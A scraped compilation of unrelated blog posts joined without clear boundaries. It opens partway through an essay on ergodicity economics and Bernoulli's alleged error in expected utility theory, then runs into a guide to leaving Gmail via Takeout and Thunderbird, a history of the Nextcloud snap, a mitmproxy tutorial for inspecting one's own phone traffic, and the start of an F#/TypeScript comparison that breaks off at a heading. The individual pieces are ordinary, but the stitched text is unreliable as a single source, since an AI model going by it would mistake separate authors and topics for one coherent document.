<p>(Eq.3) &nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u+%5Crangle+%3D+%5Cleft%5Clangle%5Cln%5Cleft%28%5Cfrac%7Bx%28t%2B%5Cdelta+t%29%7D%7Bx%28t%29%7D%5Cright%29+%5Cright%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u \rangle = \left\langle\ln\left(\frac{x(t+\delta t)}{x(t)}\right) \right\rangle" title="\langle \delta u \rangle = \left\langle\ln\left(\frac{x(t+\delta t)}{x(t)}\right) \right\rangle">.</p>
<p>Now divide both sides by <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+t&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta t" title="\delta t"></p>
<p>(Eq.4) &nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Cfrac%7B1%7D%7B%5Cdelta+t%7D%5Clangle+%5Cdelta+u+%5Crangle+%3D+%5Cfrac%7B1%7D%7B%5Cdelta+t%7D+%5Cleft%5Clangle%5Cln%5Cleft%28%5Cfrac%7Bx%28t%2B%5Cdelta+t%29%7D%7Bx%28t%29%7D%5Cright%29+%5Cright%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\frac{1}{\delta t}\langle \delta u \rangle = \frac{1}{\delta t} \left\langle\ln\left(\frac{x(t+\delta t)}{x(t)}\right) \right\rangle" title="\frac{1}{\delta t}\langle \delta u \rangle = \frac{1}{\delta t} \left\langle\ln\left(\frac{x(t+\delta t)}{x(t)}\right) \right\rangle">.</p>
<p>What’s this? In any field other than economics, this object is called the expected exponential growth rate of wealth. No utility required, no psychology required. Digging just a little bit deeper, the whole story comes to light. Wealth dynamics are fundamentally multiplicative — we can invest wealth to generate more wealth. For such dynamics the exponential growth rate is an ergodic observable, which means its expectation value tells us what happens in the long run. Mystery solved! People just optimize what happens to their wealth over time. Crucially, additive wealth changes, <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta x" title="\delta x"> are not ergodic, wherefore the expectation value in (Eq.1) does NOT tell us what happens over time.</p>
<p>Economics textbooks and papers miss this point. The problem is treated in an a-temporal space, as a so-called “one-shot game”. The mathematics is the mathematics of things happening in parallel universes, not of things happening over time. Where time is mentioned, it is usually wrongly assumed that <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+x+%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta x \rangle" title="\langle \delta x \rangle"> indicates what happens over time. Endless arguments ensue over whether <img src="https://s0.wp.com/latex.php?latex=%5Cln+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\ln x" title="\ln x"> is the correct psychological re-weighting people apply to wealth — in reality this is a question about dynamics, with psychology as a second-order effect — of course we can be deceived, confused, or stupid and not act in our best interest. It’s also far from easy to put a number on wealth <img src="https://s0.wp.com/latex.php?latex=x%28t%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x(t)" title="x(t)">, or indeed on the different <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta x" title="\delta x"> and their probabilities involved in real-world decisions.</p>
<p>The history of economics is a wonderful example of how a basic conceptual error prevents the detection of technical errors and inconsistencies. Without the right concepts it’s just not possible to ask the right questions, let alone find consistent answers.</p>
<h3>How much would I pay for a lottery ticket?</h3>
<p>Let’s put our conceptual troubles aside for a moment and use EUT to address precisely one of the questions Bernoulli asked. My initial wealth is <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x">, I have to pay a ticket fee <img src="https://s0.wp.com/latex.php?latex=F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F" title="F">, and I can win prizes <img src="https://s0.wp.com/latex.php?latex=G%28n%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="G(n)" title="G(n)"> with probabilities <img src="https://s0.wp.com/latex.php?latex=p%28n%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="p(n)" title="p(n)">, where <img src="https://s0.wp.com/latex.php?latex=1%5Cleq+n+%5Cleq+N&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="1\leq n \leq N" title="1\leq n \leq N"> is a random integer denoting which of the <img src="https://s0.wp.com/latex.php?latex=N&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="N" title="N"> possible prizes I win. We imagine the lottery to take a time <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+t&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta t" title="\delta t"> that doesn’t depend on which prize is won.</p>
<p>EUT says: find the value <img src="https://s0.wp.com/latex.php?latex=F_%7B%5Ctext%7Bmax%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F_{\text{max}}" title="F_{\text{max}}"> that makes the expected change in utility zero. If I pay more, the lottery will have a negative expected utility change, and EUT would advise me not to take part. Mathematically, here is the object we have to compute:</p>
<p>(Eq.5) &nbsp;&nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle%5Cdelta+u+%5Crangle%3D+%5Csum_n+p%28n%29+u%28x%2BG%28n%29-F%29+-+u%28x%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle\delta u \rangle= \sum_n p(n) u(x+G(n)-F) - u(x)" title="\langle\delta u \rangle= \sum_n p(n) u(x+G(n)-F) - u(x)"></p>
<p>That’s it. Now vary <img src="https://s0.wp.com/latex.php?latex=F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F" title="F"> so that the expected change in utility becomes zero. The value of <img src="https://s0.wp.com/latex.php?latex=F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F" title="F"> where that happens is the maximum fee I should pay for the lottery.</p>
<h2>Bernoulli’s error</h2>
<p>Bernoulli makes an error when he talks about this fee. The key figure is on p.26, and I’ve scribbled in red a translation of Bernoulli’s notation into the symbols used in <a href="https://doi.org/10.1063/1.4940236" target="_blank" rel="noopener">Peters and Gell-Mann (2016)</a>.</p>

<p>Let me talk you through the figure. The horizontal axis represents wealth <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x">, and the vertical axis represents utility, so that the solid curve is the utility function <img src="https://s0.wp.com/latex.php?latex=u%28x%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="u(x)" title="u(x)">.</p>
<p>Let’s focus on the solid horizontal line first. The point B is the initial wealth <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x">. The point p, to the left of B, represents the wealth <img src="https://s0.wp.com/latex.php?latex=x-F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x-F" title="x-F">, that is, the initial wealth minus the ticket fee. The points C, D, E, F are wealth levels arrived at by adding to the initial wealth one of the possible prizes <img src="https://s0.wp.com/latex.php?latex=G%281%29%2C+G%282%29%2C+G%283%29%2C+G%284%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="G(1), G(2), G(3), G(4)" title="G(1), G(2), G(3), G(4)">.</p>
<p>You may already suspect the problem: let’s imagine outcome 1 occurs in the lottery, meaning we receive the prize <img src="https://s0.wp.com/latex.php?latex=G%281%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="G(1)" title="G(1)">. In that case, our wealth will change to <img src="https://s0.wp.com/latex.php?latex=x%2BG%281%29-F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x+G(1)-F" title="x+G(1)-F">, and not <img src="https://s0.wp.com/latex.php?latex=x%2BG%281%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x+G(1)" title="x+G(1)"> (which is the position of point C). We have to subtract the fee! The points C, D, E, F marked by Bernoulli have no relevance to the problem (unless the fee is zero).</p>
<p>Now let’s walk along the utility curve. The point o marks the utility of&nbsp; wealth <img src="https://s0.wp.com/latex.php?latex=x-F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x-F" title="x-F">, so that the dashed line po is the drop in utility associated with a drop in wealth from <img src="https://s0.wp.com/latex.php?latex=x&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x" title="x"> to <img src="https://s0.wp.com/latex.php?latex=x-F&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="x-F" title="x-F">. The points G, H, L, M (to the right of B along the utility curve) represent the utilities associated with the irrelevant wealth levels <img src="https://s0.wp.com/latex.php?latex=u%28x%2BG%281%29%29%2C+u%28x%2BG%282%29%29%2C+u%28x%2BG%283%29%29%2C+u%28x%2BG%284%29%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="u(x+G(1)), u(x+G(2)), u(x+G(3)), u(x+G(4))" title="u(x+G(1)), u(x+G(2)), u(x+G(3)), u(x+G(4))">.

<p>In <a href="https://doi.org/10.1063/1.4940236">Peters and Gell-Mann (2016)</a> we call this object <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u%5E%2B+%5Crangle+%3A%3D+%5Csum_n+p%28n%29+u%28x%2BG%28n%29%29&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u^+ \rangle := \sum_n p(n) u(x+G(n))" title="\langle \delta u^+ \rangle := \sum_n p(n) u(x+G(n))">, for want of a better symbol.</p>
<p>Now comes Bernoulli’s error. He claims that the lottery is to be valued by comparing <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u%5E%2B+%5Crangle&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u^+ \rangle" title="\langle \delta u^+ \rangle"> to the loss in utility one would suffer if one were to buy the lottery ticket for its fee but not receive any prize. The key passage is on p.26–27</p>

<p>This amounts to a decision criterion, different from (Eq.5) and inconsistent with EUT. We denote with the symbol <img src="https://s0.wp.com/latex.php?latex=%5Cdelta+u%5E-&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\delta u^-" title="\delta u^-"> what Bernoulli calls “the disutility to be suffered by losing” (Bp in his notation). Now we can write Bernoulli’s decision criterion in symbols. Bernoulli tells us to buy a ticket if the following quantity is positive, and not to buy it if it’s negative</p>
<p>(Eq.6) &nbsp; <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u%5E%2B%5Crangle+-+%5Cdelta+u%5E-+%3D+%5Cunderbrace%7B%5Clangle+u%28x%2BG%29+%5Crangle+-+u%28x%29%7D_%7B+%5Clangle+%5Cdelta+u%5E%2B%5Crangle%7D+-+%5Cunderbrace%7B%5Bu%28x%29+-+u%28x-F%29%5D%7D_%7B%5Cdelta+u%5E-%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u^+\rangle - \delta u^- = \underbrace{\langle u(x+G) \rangle - u(x)}_{ \langle \delta u^+\rangle} - \underbrace{[u(x) - u(x-F)]}_{\delta u^-}" title="\langle \delta u^+\rangle - \delta u^- = \underbrace{\langle u(x+G) \rangle - u(x)}_{ \langle \delta u^+\rangle} - \underbrace{[u(x) - u(x-F)]}_{\delta u^-}">.</p>
<h2>Error or different model?</h2>
<p>In principle, one could now say that Bernoulli just had a different model of people’s behavior than does modern economics. That would be bad enough because modern economics claims that it has the same model as Bernoulli. It’s more likely that Bernoulli got confused specifically when he tried to find the maximum fee. Otherwise he seems consistent with EUT, for instance on p.24, where he describes the certain profit (“the value of the risk in question”) that corresponds to an uncertain profit</p>

<p>Let’s really kill this. Why is (Eq.6) not a good decision criterion?</p>
<ol>
<li>It is easy to construct an example where the maximum fee I should pay, <img src="https://s0.wp.com/latex.php?latex=F_%7B%5Ctext%7Bmax%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="F_{\text{max}}" title="F_{\text{max}}">, is smaller than the smallest possible prize in the lottery, but the criterion still tells me to refrain from buying a ticket. That makes no sense: such a lottery has no downside risk. I’m guaranteed a positive net profit, the only uncertain element is how much better off I will be after the game. Intriguingly — have another look at the figure — the maximum fee calculated by Bernoulli <em>is </em>smaller than the smallest possible prize, assuming that one of the prizes will be won (the distance between B and p is smaller than the distance between B and C).</li>
<li>Another problem is this: how much should I be willing to pay for one dollar, according to Bernoulli? What? … for one dollar? One dollar, of course! Yes, but not according to Bernoulli. Try it out: <img src="https://s0.wp.com/latex.php?latex=%5Clangle+%5Cdelta+u%5E%2B%5Crangle+%3C+%5Cdelta+u%5E-&amp;bg=ffffff&amp;fg=000000&amp;s=0" alt="\langle \delta u^+\rangle < \delta u^-" title="\langle \delta u^+\rangle < \delta u^-"> for any non-zero number of dollars I buy in dollars, due to the concavity of the utility function. …</li></ol></div></article></div>

							<div><p>How to download all your emails from Gmail and read them somewhere else. And maybe a bit of why to do so…</p>
<p>Google reads your emails and sells your stuff to other companies – maybe. Who really knows? You can agree to their privacy policy, but do you really know in how many ways you as a Google user can be monetized? Maybe this sounds like a conspiracy theory. The bottom line is that I don’t want to be that +1 to Google so Google can sell my data or do whatever it does all under pretense that it will be better ‘experience’ for me at the end. There are many other reasons people decide do leave Google.</p>
<p>Read some of the stories :</p>
<ul>
<li>Kyle Piira <a href="https://www.kylepiira.com/2020/01/09/why-i-quit-google/">blog</a></li>
<li>Chris Wiegman <a href="https://chriswiegman.com/2019/09/leaving-big-tech-ecosystems-behind/">blog</a></li>
<li>Danny de Vries <a href="https://www.dandevri.es/articles/changing-mail/">blog</a></li>
<li>and many more … just keep goducking (a try to coin a new word for searching with <a href="https://duckduckgo.com/spread">DuckDuckGo</a>)</li>
</ul>
<p>Whether you despise Google and want out or are interested in playing with .mbox files here is how to do it.</p>
<h3>Goodbye Gmail</h3>
<p>When you decide to leave Gmail, you will want to do something with all you messages. Let say you want to download them and use them offline. Google makes it easy for you to download your data using <a href="https://takeout.google.com/">Google Takeout.</a> Fololow the link and since you want only email messages, click on <em>Deselect all</em> and check Mail like on the picture below.</p>
<p><img src="https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1.png" alt="" width="1189" height="273" srcset="https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1.png 1189w, https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1-300x69.png 300w, https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1-1024x235.png 1024w, https://effilicious.com/wp-content/uploads/2020/07/gmail-mbox-1-768x176.png 768w" sizes="(max-width: 1189px) 100vw, 1189px"></p>
<p>Scroll to the bottom and go through next couple of steps. At the end, you will get a message saying something like Google is working on it and you will get another message some time later with a download link for your data. I find their download page a bit confusing, but maybe that is just me. Download what is offered. Look for the .mbox file afterwards. If you used Gmail for several years it will be couple of GB big.</p>
<p>Next thing to do is find a way to read the emails from this .mbox file. I asked around a bit, goducked as well {guys on <a href="https://fosstodon.org/">fosstodon</a> [<a href="https://joinmastodon.org/">masstodon</a> (like twitter but better) instance for foss geeks and other peculiar characters] were helpful} and decided to use Thunderbird portable to read my .mbox file with emails.</p>
<h3>Hello Thunderbird</h3>
<p>The idea is simple: install a mail client that can read .mbox file and then import/open the file into/with the client. Thunderbird portable* can do just so. You can download it <a href="https://portableapps.com/apps/internet/thunderbird_portable">here</a>. If you want to use regular Thunderbird, you can. I have chosen portable version because I wanted to put everything (client and emails) on my USB drive and run it from there. The setup is pretty much the same for portable and regular app. After you installed Thunderbird, cheat your way through the new account setup in order get past setup dialogs and for local folders to appear in the main screen (look at the picture below) or follow the procedure as described <a href="https://commons.lbl.gov/display/~jwelcher@lbl.gov/Reading+an+mbox+file+with+Thunderbird">here</a>.</p>
<p><img src="https://effilicious.com/wp-content/uploads/2020/07/local-folders-150x98.png" alt="" width="194" height="98"></p>
<p>Depending on how you cheated so far, there should be some kind of account created and some other folders. Go to <em>Options –&gt; Account settings</em> and delete all accounts. You should be left with local folders only. Check the <em>Outgoing server</em> if you like just in case some unwanted settings ended up there.</p>
<p><img src="https://effilicious.com/wp-content/uploads/2020/07/delete-account.png" alt="" width="600" height="349" srcset="https://effilicious.com/wp-content/uploads/2020/07/delete-account.png 600w, https://effilicious.com/wp-content/uploads/2020/07/delete-account-300x175.png 300w" sizes="(max-width: 600px) 100vw, 600px"></p>
<p>Next thing to do is importing .mbox file into Thunderbird. You can do it by moving your .mbox file to your Thunderbird local directory. Look at the picture above. There is the path to the directory. Put the .mbox file there,restart Thunderbird and give it some time to deal with the .mbox file. After it finishes there should be a new folder in Local Folders with all your emails in it. Rename it to something wild like My exGmail…</p>
<hr>
<p>*there are probably many other email clients that can deal with mailbox file</p></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<div id="mediumInsert-94"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/96/nextcloud-19-login.jpg" alt=""></figure></div><p>I'm a few weeks late on celebrating Nextcloud's four year anniversary, but I'm doing it anyway! My how time flies. I became a part of the ownCloud community back in 2012. Heck, you can still find blog posts about how I ran it on this very blog if you scroll down far enough. Then, in 2015, I saw the post about the <a href="https://owncloud.org/news/western-digital-and-owncloud-team-up-to-bring-owncloud-to-home-users/">Western Digital/ownCloud</a> collaboration on what would eventually become the Nextcloud Box. But I'm getting ahead of myself.<br></p><p>The timing was excellent. We at Canonical were busy developing <a href="https://snapcraft.io/">Ubuntu Core and snaps</a>, and I had just recently joined the team responsible for developing snapcraft, the tool that creates snaps. I thought "What better way to learn the ins and outs of what I'm making than to participate in this competition!" So a few ownCloud community members and I worked on <a href="https://www.mail-archive.com/devel@owncloud.org/msg02257.html">exactly that</a>. It was ultimately selected as the platform to ship on the Box, <a href="https://karlitschek.de/2016/04/big-changes-i-am-leaving-owncloud-inc-today/">just in time to lose</a> every <a href="https://blog.jospoortvliet.com/2016/05/moving-on-from-owncloud.html">contact I had at ownCloud</a>.</p><p>I was disappointed. I assumed the project was dead. Then I heard from my friends, and was told about Nextcloud. And they retained the Western Digital contacts, who now wanted to continue the project with them!</p><p>I was excited. Within days of Nextcloud making their first release I had created a Nextcloud snap. You can still use Nextcloud v9 today, in fact:</p><pre>$ sudo snap install nextcloud --channel=9</pre><p>I'll always have fond memories of those pixelated clouds.</p><div id="mediumInsert-5"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/89/nextcloud-9.jpg" alt=""></figure></div><p>I was very happy with it. A one-line installation method for a production-ready Nextcloud. Let's Encrypt integration. Everything. Despite being created to enable the Nextcloud Box, we made sure that it worked on all architectures, so folks could run it wherever they wanted to.<br></p><p>Before too long, the <a href="https://nextcloud.com/box/">Nextcloud Box</a> became a reality, becoming a joint project between Nextcloud, Western Digital Labs, and Canonical (where Canonical was maintaining the image). At that time, we were actually having to patch Nextcloud to make it work the way we needed it to. We had tried upstreaming that patch to ownCloud, but they turned it down. Which means if you look at the config file you'll see a dirty little secret:</p><pre>/**<br> * Nextcloud doesn't support hosting the config file out of the application, so<br> * this version of Nextcloud has been patched slightly to allow for it. As a<br> * result, we fail the integrity check, so we'll just disable it.<br> */<br>'integrity.check.disabled' =&gt; true,<br></pre><p>Which I why I remember the Nextcloud v10 release so well: <a href="https://github.com/nextcloud/server/pull/1081">Nextcloud didn't have the same problem with that patch</a>, and as of v10 we no longer needed to patch it, and could re-enable the integrity check!<br></p><pre>$ sudo snap install nextcloud --channel=10<br></pre><div id="mediumInsert-11"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/90/nextcloud-10.jpg" alt=""></figure></div><p>That was a solid release, but it wasn't long before v11 was released with all sorts of security features and a preview of what was to become Nextcloud Talk in a few years:</p><pre>$ sudo snap install nextcloud --channel=11</pre><p>There was a lot of similarity between versions 9, 10, and 11, but a ton of new development went into version 12. That was great, but it also meant that a number things broke in version 12. Snaps automatically update, and this is when we really took <i>ownership</i> of that responsibility. We decided we weren't cool automatically breaking people. We've continued that attitude today, so if you've wondered why the snap lags upstream occasionally, that's why. Anyway, eventually the issues were resolved, and we got everyone onto v12:</p><pre>$ sudo snap install nextcloud --channel=12</pre><p>This release finally got rid of that dual menu setup (app menu on the left, settings/users on the right) and unified them really nicely:</p><div id="mediumInsert-34"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/92/nextcloud-12.jpg" alt=""></figure></div><p>Version 12 is still one of my favorite releases simply because no new major releases came out for almost a year. Sadly, it was also during this timeframe that Western Digital Labs shut down, thus ending the Nextcloud Box, and thus officially turning the Nextcloud snap into a personal project for me. Despite that, we settled into a groove of maintenance, and our userbase (and group of testers, who are amazing) grew significantly.<br></p><p>Version 13 saw quite a leap in functionality and design:<br></p><pre>$ sudo snap install nextcloud --channel=13</pre><p>For example, this is where Nextcloud Talk officially made its debut. It's also where they got rid of those pixelated clouds and replaced them with a nice abstract banner:<br></p><div id="mediumInsert-23"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/91/nextcloud-13.jpg" alt=""></figure></div><p>It was only a few months before the update drum started for v14, which came with all sorts of stuff like SMS 2FA and GDPR compliance:</p><pre>$ sudo snap install nextcloud --channel=14</pre><p>Nextcloud 15 took that even further:</p><pre>$ sudo snap install nextcloud --channel=15</pre><p>This is the release that added support for my beloved Yubikey, U2F, and TOTP. This is also where they introduced Nextcloud Social for a federated social network.</p><div id="mediumInsert-51"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/93/nextcloud-15.jpg" alt=""></figure></div><p>Nextcloud 16 came with a much-improved Nextcloud Talk, as well as more fine-grained permissions by way of an access control list:</p><pre>$ sudo snap install nextcloud --channel=16</pre><p>Version 17 is where the remote wipe functionality made its debut, and the shiny new Text app was introduced as the default text editor:</p><pre>$ sudo snap install nextcloud --channel=17</pre><div id="mediumInsert-71"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/94/nextcloud-17.jpg" alt=""></figure></div><p>Nextcloud 18 saw a slight rebranding. They started calling it Nextcloud Hub, and made it super easy to preinstall "recommended" apps, which included Only Office for collaborative document editing:</p><pre>$ sudo snap install nextcloud --channel=18</pre><p>And now we come to current day, version 19, where they switched to Collabora for collaborative document editing instead of Only Office:</p><pre>$ sudo snap install nextcloud --channel=19</pre><div id="mediumInsert-93"><figure><img src="https://kyrofa.com/uploads/proclaim/image/image/95/nextcloud-19.jpg" alt=""></figure></div><p>Along with Nextcloud 19, we at Canonical have started the <a href="https://ubuntu.com/appliance">Ubuntu Appliance portfolio</a>, which <a href="https://ubuntu.com/appliance/nextcloud">includes Nextcloud</a>. This is essentially a bring-your-own-box Nextcloud Box: an image with the Nextcloud snap already on there, waiting to be flashed onto a Raspberry Pi or a NUC or something. As soon as it's flashed and booted, you have a Nextcloud install.</p><p>Anyway, I hope this brief walk through history was interesting. Note that all the snap tracks used here will be open forever, so you're welcome to use even the first Nextcloud, but as a general rule of thumb, only the two most recent major releases are actually supported and receive updates. Of course, if you just want the latest stable version, you don't need to specify a track at all:</p><pre>$ sudo snap install nextcloud<br></pre><p>It's been a good four years. Here's to many more!<br></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main"><article>
  
  <div><p>From time to time I like to fire up <a href="https://mitmproxy.org/">mitmproxy</a> and route my phone’s traffic through my computer. This allows your computer, via mitmproxy, to inspect and even alter HTTP(s) requests applications and other services on your phone are performing.</p>

<p>Most recently I have been looking a bit location data and marketing. I discovered that upon launching the Deliveroo app extremely precise location data is sent to a company called <a href="https://www.braze.com/">Braze</a>. Braze has other well known customers like GAP, Microsoft, KFC, Dominos, okcupid. Not all use of Braze will send this granular location data though.</p>

<blockquote>
  <p>On app launch Deliveroo sends stupidly accurate location data(15 decimals, metre precision) to a market company called Braze(formerly AppBoy). Many other apps do similar things and it’s slightly terrifying.</p>

<h2 id="knowledge-is-power">Knowledge is Power</h2>

<p>Since knowledge is power I decided I should write up the method used here so you dear reader can also go spelunking.</p>

<p>There are many ways to install mitmproxy and they are all documented on the <a href="https://docs.mitmproxy.org/stable/overview-installation/">mitmproxy documentation site</a>. On macOS the easiest way is using the excellent tool <a href="https://brew.sh/">Homebrew</a>.</p>

<figure><pre><code data-lang="plain">brew install mitmproxy</code></pre></figure>

<p>After installing <code>mitmproxy</code> it is easy to start by just invoking it</p>

<figure><pre><code data-lang="plain">mitmproxy</code></pre></figure>

<p>mitmproxy acts as a HTTP(s) proxy and in order to tunnel your phone’s traffic through your computer you need to set the computer as a proxy on your phone.</p>

<p>On iOS this is done under <code>Wi-Fi &gt; Configure Proxy</code>. Here you want to configure a manual proxy pointing to the local ip of your computer, you can find out what your local ip is with <code>ifconfig</code> on macOS and Linux and <code>ipconfig</code> on Windows. For the port use <code>8080</code>.</p>

<p><img src="https://hugotunius.se/img/spelunking-with-mitmproxy/ios-proxy-config.jpeg?1594023082" alt=""></p>

<p>For Android consult this <a href="https://stackoverflow.com/questions/21068905/how-to-change-proxy-settings-in-android-especially-in-chrome">Stack Overflow question</a></p>

<p>At this point if you navigate to <code>http://example.com</code> on your phone the request should show up on your computer. However all HTTPS request will fail because mitmproxy is trying to man in the middle the request which will cause untrusted certificate errors. To remedy this navigate to <code>mitm.it</code> on your phone and click the icon for your OS. This will prompt you to install a root certificate for mitmproxy so it can decrypt HTTPS traffic.</p>

<p><strong>Note:</strong> You should be careful about installing root certificates as doing so can defeat HTTPS completely if the certificate is from a malicious actor. The mitmproxy certificate is fine to install.</p>

<p>On iOS you additionally need to trust the certificate under <code>General &gt; About &gt; Certificate Trust Settings</code>. At this point HTTPS request should also start showing up on your computer.</p>

<h2 id="going-spelunking">Going Spelunking</h2>

<p>Now you are ready to go spelunking. Most apps will send certain interesting requests only on startup so killing an app and starting it again is advisable. In mitmproxy you can nagivate in the request flow with the <code>j</code> and <code>k</code> keys to. Selecting a specific flow with <code>enter</code> opens a detailed overview over the request. The detailed view shows request information as well as the response the server returned. You can switch between these with <code>tab</code>. <code>q</code> takes you back to the request flow. <code>z</code> clears the request flow which can be useful when it starts filling up.</p>

<p><strong>Pro Tip:</strong> In any view in mitmproxy you can press <code>?</code> to show a list of available actions and which key(s) they are bound to.</p>

<p>The request flow can be filtered with <code>f</code> using a pretty advanced <a href="https://docs.mitmproxy.org/stable/concepts-filters/">query syntax</a>. For example when I was looking for apps that send my location data I used the following filter</p>

<figure><pre><code data-lang="plain">(~bq latitude | ~bq longitude | ~bq lat | ~bq long | ~bq lng)</code></pre></figure>

<p>If you find anything interesting feel free to <a href="https://twitter.com/k0nserv">tweet at me</a>.</p>

<p>Happy spelunking 😄</p>

    <p>While there are many UI libraries available today to build modern web apps, the number of programming languages that compile to JavaScript has also increased in recent years. Here is a quick take on F# and TypeScript.</p>
    
    <h2>Preface</h2>
<p>Although I did focus on mobile apps in the last years, I've spent the first decade or so of my career concatenating strings, also known as web development. So I think I might know a thing or two about how things work there.</p>
<p>However, as I watched the latest hype cycles in the JavaScript universe from the sidelines, I do not have many preferences when choosing "the right" technology stack. Except for one thing. I know for sure that I do not want to build serious software with JavaScript again, except when it acts as a compilation target for a more capable programming language.</p>
<p>So I did take a look at a couple of potential candidates: <a href="https://elm-lang.org/">Elm</a>, <a href="https://reasonml.org/">Reason</a>, <a href="https://www.typescriptlang.org/">TypeScript</a>, and <a href="https://fsharp.org/">F#</a>.</p>
<h2>Shortlist</h2>
<p>While I respect Elm and Reason, the overall experience seemed very close to web development with F#. Which can also be used for server-side tasks (even code-sharing between client and server is possible). So out of those four, F# and TypeScript are the most serious candidates for me. Sorry Elm. Sorry Reason.</p>
<h3>F#</h3>
<p>Since finally <a href="https://thomasbandt.com/who-cares-about-functional-programming">crossing the chasm</a> in 2017, I am a big fan of the language. As a long-time C# developer, it brought back the joy in programming to me. Making a case for using it in production at a larger scale project would intrigue me.</p>
<p>Interestingly, F# today is considered a language targeting two platforms: .NET and JavaScript. That is made possible through <a href="https://fable.io/">Fable</a>, "a compiler powered by Babel designed to make F# a first-class citizen of the JavaScript ecosystem" â€“ which sounds promising, doesn't it.</p>
<h3>TypeScript</h3>
<p>When Microsoft announced <a href="https://www.typescriptlang.org/">TypeScript</a> back in 2012, tooling was poor and excitement limited. It needed a significant player in the JavaScript world, Angular, to pick it up, to gain momentum. Today it is so widely used that I consider it the de facto standard for modern web development.</p>
<p>Its success is driven by a powerful type system plus the fact that it is similar enough to JavaScript to keep the learning curve relatively flat. Besides support for immutable data structures, I do not miss much of what I would expect from a modern programming language.</p>
<h2>A Small Case Study</h2>
<p>Now, how to make an informed decision that is not solely based on gut feelings? Good question. I decided to <a href="https://github.com/aspnetde/typesafe-spa">conduct a small case study</a>, which I designed to explore three different options to build a type-safe single page application:</p>
<ol>
<li><a href="https://github.com/aspnetde/typesafe-spa#elmish--feliz">F# + Elmish + Feliz</a></li>
<li><a href="https://github.com/aspnetde/typesafe-spa#react-function-components--feliz">F# + React Function Components + Feliz</a></li>
<li><a href="https://github.com/aspnetde/typesafe-spa#react-function-components--feliz">TypeScript + React</a></li>
</ol>
<p>In particular, I wanted to find answers to the following questions:</p>
<ol>
<li>How are parent-child relationships handled?</li>
<li>How much boilerplate code needs to be written?</li>
<li>How much guidance and support provides the compiler?</li>
<li>How maintainable, aka scalable, does the approach appear to be?</li>
</ol>
<p>The answers to those questions have already been covered in a <a href="https://thomasbandt.com/scaling-model-view-update">separate post</a>. Summary: Going with React components, either with F# or TypeScript, will make you write less code. Whereas choosing MVU (with F# + Elmish) may provide more safeguards through an architecture that is easy to understand and harder to produce errors in.</p>
<p>The bottom line is: Technically, all three approaches are valid, each of them has different strengths and weaknesses. So I cannot recommend one over the other. But I can introduce some more things to consider when making that choice.</p>
<h2>More Things To Consider</h2>
<h3>Language Qualities</h3>
